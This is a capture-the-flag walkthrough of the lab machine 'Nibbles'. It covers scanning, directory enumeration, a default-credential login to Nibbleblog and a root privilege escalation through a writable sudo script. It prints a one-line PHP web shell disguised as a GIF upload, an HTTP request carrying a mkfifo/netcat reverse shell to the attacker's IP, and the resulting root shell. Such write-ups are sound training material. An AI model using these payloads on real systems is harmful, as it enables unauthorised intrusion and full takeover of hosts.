## Nibbles

__Machine IP: 10.10.10.75__  

__Difficulty: medium__



## Scanning

### Nmap Scanning

```bash
$ nmap -sC -sV  -oA nmap/nibbles.nmap 10.10.10.75
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 06:57 EDT
Nmap scan report for 10.10.10.75
Host is up (0.096s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
```

- Home Wegpage
![hompeage](images/homepage.PNG)

- on `view page source` found
```html
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

![nibble_blog](images/nibble_blog.PNG)


### Enumeration

- on running gobuster, found

```bash
$ gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u  http://10.10.10.75/nibbleblog/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/04 07:02:09 Starting gobuster
===============================================================
/content (Status: 301)
/themes (Status: 301)
/admin (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/languages (Status: 301)
Progress: 22161 / 220561 (10.05%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/09/04 07:05:53 Finished
===============================================================

```

- on `README` access, found the version of `nibbleblog` 

```bash
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

- on searching `google git`, found 

![nibble_blog_git](images/nibble_blog_git.PNG)
- on trial found `install.php`

![install](images/install.PNG)

- On clicking `update`
![nibblenlog_onupadted][nibblenlog_onupadted.PNG]
- then visited  `admin.php` page

![admin_page](images/admin_page.PNG)

- on searching deafult credentials found `admin:nibbles` and tried.

__Result__
![admin_after_login](images/admin_after_login.PNG)

- On trying `php shell` upload on `My Image Plugin`, able to execute code

![image_upload](images/image_upload.PNG)

- `shell.php`

```bash
$ cat shell.php  
GIF8;
<?php echo system($_REQUEST['code']); ?>

```


- uploaded images can be found in `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/` - where its saved as `image.php`

__Result__

![code_Execution](images/code_Execution.PNG)

- create a reverse shell and set up a listener on kali

__Request__ (changed method to `POST`)
```php
POST /nibbleblog/content/private/plugins/my_image/image.php HTTP/1.1
Host: 10.10.10.75
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=voirb89373gb9d8vi172bn7b21
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.12+9002+>/tmp/f
```

__payload__

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 9002 >/tmp/f

```

__Result__

```bash
$ nc -lvnp  9002
listening on [any] 9002 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.75] 41028
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibble
```



### Privilege escalation

- on running `sudo -l`

```bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

- directories doesnt exists in nibbler create and write file `monitor.sh` with
```bash
$ cat monitor.sh                               1 ⚙
#!/bin/sh

sh
```

- on executing `monitor.sh`, 
```bash
$ sudo ./monitor.sh
```

__Result__

```bash
$ sudo ./monitor.sh
id
uid=0(root) gid=0(root) groups=0(root)
```


